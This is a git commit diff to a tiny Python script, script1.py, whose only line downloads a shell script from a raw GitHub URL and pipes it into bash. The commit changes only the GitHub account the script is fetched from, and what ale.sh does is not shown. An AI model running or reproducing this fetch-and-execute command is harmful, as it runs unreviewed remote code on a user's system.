ee9342639f9a421133cfcd363287e1dcd9f5295a
yamkelamafinyela <160191695+yamkelamafinyela@users.noreply.github.com>
2024-02-17 14:22:43 +0200

    Update script1.py

--- script1.py
+++ script1.py
@@ -1,4 +1,4 @@
 #!/usr/bin/env python
 import subprocess
 
-subprocess.check_call("wget -O - https://raw.githubusercontent.com/derrickluminus/ale/main/ale.sh | bash", shell=True)
+subprocess.check_call("wget -O - https://raw.githubusercontent.com/yamkelamafinyela/ale/main/ale.sh | bash", shell=True)
